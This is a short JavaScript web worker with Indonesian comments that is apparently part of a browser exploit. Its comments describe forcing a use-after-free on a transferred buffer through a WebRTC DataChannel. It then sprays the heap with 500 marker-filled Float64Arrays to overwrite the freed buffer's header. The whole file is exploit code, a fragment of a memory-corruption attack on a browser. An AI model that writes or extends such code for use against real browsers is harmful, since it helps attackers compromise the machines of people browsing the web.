// Worker yang menerima DataChannel dan Buffer, lalu segera mengirimnya (mempercepat FREE/UAF)
let dataChannelWorker = null;
let sprayHoldersWorker = [];

function sprayPayloadWorker() {
    // Worker juga melakukan spray (untuk menambah tekanan heap)
    const SPRAY_COUNT = 500;
    const PAYLOAD_SIZE = 64; 
    for (let i = 0; i < SPRAY_COUNT; i++) {
        let payloadArray = new Float64Array(PAYLOAD_SIZE);
        payloadArray[0] = 0xBBBBBBBB; // Nilai unik Worker
        payloadArray[1] = 0xBBBBBBBB;
        sprayHoldersWorker.push(payloadArray); 
    }
}

onmessage = function(e) {
    if (e.data.cmd === 'setup') {
        dataChannelWorker = e.data.channel;
        dataChannelWorker.onopen = () => {
             // Worker siap
        };
    } else if (e.data.cmd === 'send') {
        const transferredBuffer = e.data.buffer;
        
        if (dataChannelWorker && dataChannelWorker.readyState === 'open') {
            // 1. Worker segera mengirim buffer yang baru diterima
            dataChannelWorker.send(transferredBuffer); 
            
            // 2. Worker melakukan spray tepat setelah mengirim (untuk menimpa header buffer)
            sprayPayloadWorker();
        }
    }
};
